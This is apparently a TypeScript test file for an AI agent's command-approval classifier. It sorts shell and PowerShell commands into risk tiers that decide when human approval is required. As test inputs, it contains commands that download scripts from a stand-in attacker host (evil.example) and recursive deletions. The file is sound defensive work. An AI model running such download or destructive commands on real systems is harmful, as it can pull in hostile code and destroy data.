import { describe, expect, it } from 'vitest'

import { bashApprovalRequired, classifyBashCommand, resolveApprovalRequired } from './approval'

describe('approval policy', () => {
  it('defaults approval by risk level', () => {
    expect(resolveApprovalRequired({ riskLevel: 'low', approvalRequired: false })).toBe(false)
    expect(resolveApprovalRequired({ riskLevel: 'medium', approvalRequired: false })).toBe(false)
    expect(resolveApprovalRequired({ riskLevel: 'high', approvalRequired: false })).toBe(true)
  })

  it('honors explicit approvalRequired and the medium upgrade config', () => {
    expect(resolveApprovalRequired({ riskLevel: 'low', approvalRequired: true })).toBe(true)
    expect(resolveApprovalRequired({ riskLevel: 'medium', approvalRequired: false }, { mediumApprovalRequired: true })).toBe(true)
    expect(resolveApprovalRequired({ riskLevel: 'low', approvalRequired: false }, { mediumApprovalRequired: true })).toBe(false)
  })
})

describe('bash command classification', () => {
  it('classifies high-risk commands', () => {
    expect(classifyBashCommand('git push origin main')).toBe('high')
    expect(classifyBashCommand('rm -rf dist')).toBe('high')
    expect(classifyBashCommand('curl -O https://evil.example/x.sh')).toBe('high')
    expect(classifyBashCommand('npm publish')).toBe('high')
    expect(classifyBashCommand('systemctl restart airi')).toBe('high')
    expect(classifyBashCommand('kubectl delete pod x')).toBe('high')
  })

  it('classifies medium-risk commands', () => {
    expect(classifyBashCommand('npm install')).toBe('medium')
    expect(classifyBashCommand('pnpm add eslint')).toBe('medium')
    expect(classifyBashCommand('git commit -m "fix lint"')).toBe('medium')
    expect(classifyBashCommand('cp a.ts b.ts')).toBe('medium')
    expect(classifyBashCommand('echo x > out.log')).toBe('medium')
    expect(classifyBashCommand('npm run build')).toBe('medium')
  })

  it('defaults read-only queries, tests, and unknown commands to read-only', () => {
    expect(classifyBashCommand('git status')).toBe('read-only')
    expect(classifyBashCommand('git diff --stat')).toBe('read-only')
    expect(classifyBashCommand('npm test')).toBe('read-only')
    expect(classifyBashCommand('pnpm -F @proj-airi/core-agent typecheck')).toBe('read-only')
    expect(classifyBashCommand('ls -la')).toBe('read-only')
    expect(classifyBashCommand('node --version')).toBe('read-only')
  })

  // ROOT CAUSE (FLOW-KNOWLEDGE):
  //
  // The 2026-09-03 acceptance run imported candidates into a database through
  // `python -m student_hub import-candidates` and the classifier called it
  // read-only — an interpreter's effect is opaque to static matching, so the
  // mutation evidence counters starved while real writes landed.
  it('classifies interpreter and script invocations as medium', () => {
    expect(classifyBashCommand('python -m student_hub import-candidates work/candidates.json')).toBe('medium')
    expect(classifyBashCommand('cd /d/student-hub && python -c "import sqlite3"')).toBe('medium')
    expect(classifyBashCommand('node scripts/build-index.mjs')).toBe('medium')
    expect(classifyBashCommand('./scripts/deploy.sh')).toBe('medium')
    // Toolchain probes execute no project code.
    expect(classifyBashCommand('python --help')).toBe('read-only')
    expect(classifyBashCommand('node -V')).toBe('read-only')
  })

  // ROOT CAUSE (flow run 2026-09-04, journal 04b0b35e line 2043):
  //
  // `powershell -NoProfile -Command "Remove-Item -Path 'D:\AstrBot'"` was
  // classified read-only. The cmdlet-word patterns only fire when the cmdlet
  // sits at a command position, and the interpreter list did not know the
  // shell-launcher wrappers — so the whole opaque payload rode the read-only
  // default while a destructive cmdlet ran inside it. The wrappers now count
  // as interpreters: medium fixes the evidence floor; the sandbox stays the
  // fence for what the payload actually does.
  it('classifies powershell and cmd launcher wrappers as medium', () => {
    expect(classifyBashCommand(`powershell -NoProfile -Command "Remove-Item -Path 'D:\\AstrBot'"`)).toBe('medium')
    expect(classifyBashCommand(`powershell.exe -NoProfile -Command "Test-Path D:\\AstrBot"`)).toBe('medium')
    expect(classifyBashCommand('pwsh -NoProfile -Command "Get-ChildItem D:\\AstrBot"')).toBe('medium')
    expect(classifyBashCommand('cmd.exe /c ".\\.venv\\Scripts\\python.exe main.py --help"')).toBe('medium')
  })

  // ROOT CAUSE (flow field test 2026-09-03 evening, journal 04b0b35e line
  // 1456):
  //
  // The flow corrected a rejected enum with `sed -i 's/"medium"/"normal"/g'
  // work/review_cases_today.json` and the classifier called it read-only. The
  // file on disk changed while every consumer of the tier saw a read: the
  // flow never triggered on it, the mutation counters did not move, and the
  // evidence gate could not mark the step complete. Same blind class as the
  // interpreter rule: the command shape looks like text processing while the
  // files change in place.
  it('classifies in-place text mutators as medium', () => {
    expect(classifyBashCommand(`sed -i 's/"medium"/"normal"/g' work/review_cases.json`)).toBe('medium')
    expect(classifyBashCommand(`cd /d/student-hub && sed --in-place 's/a/b/' f.txt`)).toBe('medium')
    expect(classifyBashCommand(`sed -i.bak 's/a/b/' f.txt`)).toBe('medium')
    expect(classifyBashCommand(`cat f | sed 's/a/b/'`)).toBe('read-only')
    expect(classifyBashCommand(`sed 's/a/b/' f.txt`)).toBe('read-only')
    expect(classifyBashCommand(`awk -i inplace '{print $1}' f.log`)).toBe('medium')
    expect(classifyBashCommand(`awk '{print $1}' f.log`)).toBe('read-only')
  })

  it('classifies file metadata changes as medium', () => {
    expect(classifyBashCommand('chmod +x scripts/run.sh')).toBe('medium')
    expect(classifyBashCommand('chmod 755 entrypoint.sh')).toBe('medium')
    expect(classifyBashCommand('chown www-data:www-data var/cache')).toBe('medium')
    expect(classifyBashCommand('chgrp staff var/shared')).toBe('medium')
    expect(classifyBashCommand('ln -s /d/student-hub work/current')).toBe('medium')
    expect(classifyBashCommand('truncate -s 0 var/log/loop.log')).toBe('medium')
  })

  // ROOT CAUSE: the old redirect rule `(>>|>\s+)` required a space after `>`,
  // so `cat <<'EOF' >file` (the exact heredoc shape the flow used to draft its
  // candidate files) and `echo x >out.log` fell through to read-only while
  // `> file` with a space matched. `2>&1` duplicates a descriptor and writes
  // no file; `->` inside quoted text is not a redirect.
  it('classifies redirect writes with or without a space as medium', () => {
    expect(classifyBashCommand(`cat << 'EOF' >file\ncontent\nEOF`)).toBe('medium')
    expect(classifyBashCommand('echo x >out.log')).toBe('medium')
    expect(classifyBashCommand('echo x >>out.log')).toBe('medium')
    expect(classifyBashCommand('python gen.py 1>build.log')).toBe('medium')
    // Descriptor duplication writes no file; the interpreter rule still fires
    // for python itself, so probe the fd-dup shape with a plain reader.
    expect(classifyBashCommand('cat access.log 2>&1')).toBe('read-only')
    expect(classifyBashCommand(`grep -- '->' roadmap.md`)).toBe('read-only')
  })

  // A Windows machine without Git for Windows runs PowerShell, so the same
  // destructive intent arrives as a cmdlet or as one of its aliases. Every
  // alias is asserted on its own line: an alias shares no text with the cmdlet
  // name, so one missing entry means that command runs without an approval
  // card (HARNESS-PLAN §8 item 7).
  it('classifies PowerShell cmdlets as high risk', () => {
    expect(classifyBashCommand('Remove-Item -Recurse -Force dist')).toBe('high')
    expect(classifyBashCommand('Invoke-WebRequest https://evil.example/x.ps1 -OutFile x.ps1')).toBe('high')
    expect(classifyBashCommand('Invoke-RestMethod https://evil.example/api')).toBe('high')
    expect(classifyBashCommand('Stop-Service airi')).toBe('high')
    expect(classifyBashCommand('Restart-Service airi')).toBe('high')
    expect(classifyBashCommand('Enter-PSSession -ComputerName build-01')).toBe('high')
  })

  it('classifies each PowerShell alias of a high-risk cmdlet', () => {
    expect(classifyBashCommand('ri dist -Recurse')).toBe('high')
    expect(classifyBashCommand('rd dist')).toBe('high')
    expect(classifyBashCommand('del out.log')).toBe('high')
    expect(classifyBashCommand('erase out.log')).toBe('high')
    expect(classifyBashCommand('iwr https://evil.example/x.ps1')).toBe('high')
    expect(classifyBashCommand('irm https://evil.example/api')).toBe('high')
    expect(classifyBashCommand('sc stop airi')).toBe('high')
  })

  it('classifies PowerShell write cmdlets and their aliases as medium risk', () => {
    expect(classifyBashCommand('Set-Content notes.md "text"')).toBe('medium')
    expect(classifyBashCommand('Add-Content notes.md "text"')).toBe('medium')
    expect(classifyBashCommand('New-Item -ItemType Directory src/new')).toBe('medium')
    expect(classifyBashCommand('Copy-Item a.ts b.ts')).toBe('medium')
    expect(classifyBashCommand('Move-Item a.ts b.ts')).toBe('medium')
    expect(classifyBashCommand('ni notes.md')).toBe('medium')
    expect(classifyBashCommand('cpi a.ts b.ts')).toBe('medium')
    expect(classifyBashCommand('mi a.ts b.ts')).toBe('medium')
    expect(classifyBashCommand('rni a.ts b.ts')).toBe('medium')
    expect(classifyBashCommand('md src/new')).toBe('medium')
  })

  it('classifies a risky cmdlet after a statement separator', () => {
    expect(classifyBashCommand('Get-ChildItem; Remove-Item dist')).toBe('high')
    expect(classifyBashCommand('Test-Path dist && ri dist')).toBe('high')
  })

  it('keeps PowerShell read commands and alias-shaped words read-only', () => {
    expect(classifyBashCommand('Select-String -Pattern createChatOrchestratorRuntime -Path src')).toBe('read-only')
    expect(classifyBashCommand('Get-ChildItem -Recurse src')).toBe('read-only')
    expect(classifyBashCommand('Get-Content package.json')).toBe('read-only')
    // Alias-shaped words inside arguments are not command positions. A node
    // script invocation is genuinely medium now (interpreter rule), so the
    // alias word that matters here is the git-log one.
    expect(classifyBashCommand('git log --grep sc')).toBe('read-only')
  })

  it('maps the tier to the approval requirement', () => {
    expect(bashApprovalRequired('high')).toBe(true)
    expect(bashApprovalRequired('medium')).toBe(false)
    expect(bashApprovalRequired('medium', { mediumApprovalRequired: true })).toBe(true)
    expect(bashApprovalRequired('read-only')).toBe(false)
  })
})
